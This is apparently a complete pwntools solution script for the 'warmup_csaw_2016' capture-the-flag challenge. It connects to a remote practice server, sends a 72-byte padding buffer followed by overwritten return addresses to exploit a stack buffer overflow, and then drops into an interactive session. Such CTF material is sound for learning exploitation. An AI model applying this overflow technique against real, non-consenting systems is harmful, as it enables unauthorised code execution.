from pwn import *
#r = process("./warmup_csaw_2016")
r = remote("node4.buuoj.cn",26149) 
r.recvuntil("WOW:")
payload=b"A"*72+p64(0x40061D)+p64(0x40060D)
r.sendline(payload)
r.interactive()
